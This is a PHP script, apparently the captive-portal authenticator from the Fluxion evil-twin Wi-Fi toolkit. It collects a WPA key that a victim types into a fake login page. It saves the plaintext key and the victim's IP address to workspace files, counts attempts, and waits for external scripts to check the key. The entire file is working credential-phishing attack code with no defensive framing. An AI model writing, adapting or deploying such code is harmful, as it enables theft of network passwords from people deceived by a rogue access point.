<?php
  error_reporting(0);

  // Store get & post data to variables.
  $candidate_key_fields = array(
    "password",
    "password1",
    "passphrase",
    "key",
    "key1",
    "wpa",
    "wpa_psw");

  // Get array of keys matching any in $candidate_key_fields.
  $candidate_key_fields_matches = array_intersect_key($_POST, array_flip($candidate_key_fields));

  // Retrieve just the first matched value.
  $candidate_key = reset($candidate_key_fields_matches);

  // The following varible represents the authenticator result.
  // By default, we assume the password is incorrect (value 0).
  // WARNING: The variable below is used by external scripts.
  // That means it MUST be defined before exiting returning.
  $candidate_key_result = 0;

  // Attempt verification only if a key exists.
  if(!empty($candidate_key))
  {
    // Increment hit attempts.
    $page_hits_log_path = ("$FLUXIONWorkspacePath/hit.txt");
    $page_hits = file($page_hits_log_path)[0] + 1;
    $page_hits_log = fopen($page_hits_log_path, "w");
    fputs($page_hits_log, $page_hits);
    fclose($page_hits_log);

    // Prepare candidate, and attempt, passwords files' locations.
    // Notice: The values in the strings below will be substituted
    // by the script once the autheticator script is deployed.
    $attempt_log_path = "$FLUXIONWorkspacePath/pwdattempt.txt";
    $candidate_key_path = "$FLUXIONWorkspacePath/candidate.txt";

    $attempt_log_file = fopen($attempt_log_path, "w");
    fwrite($attempt_log_file, $candidate_key);
    fwrite($attempt_log_file, "\n");
    fclose($attempt_log_file);

    // Write candidate key to file to prep for checking.
    $candidate_key_file = fopen($candidate_key_path, "w");
    fwrite($candidate_key_file, $candidate_key);
    fwrite($candidate_key_file, "\n");
    fclose($candidate_key_file);

    // Prepare clients IP log path, and client IP.
    $clients_IP_log_path = "/tmp/fluxspace/ip_hits";
    $client_IP = $_SERVER['REMOTE_ADDR'];

    // Write client IP to log file.
    $clients_IP_file = fopen($clients_IP_log_path, "w");
    fwrite($clients_IP_file, $client_IP);
    fclose($clients_IP_file);

    $candidate_key_result_path = "$FLUXIONWorkspacePath/candidate_result.txt";

    // Create candidate result file to trigger checking.
    $candidate_key_result_file = fopen($candidate_key_result_path, "w");
    fwrite($candidate_key_result_file,"\n");
    fclose($candidate_key_result_file);

    do {
      sleep(1);
      $candidate_key_result = trim(file_get_contents($candidate_key_result_path));
    } while (!ctype_digit($candidate_key_result));

    // Reset file by deleting it.
    unlink($candidate_key_result_path);
  }
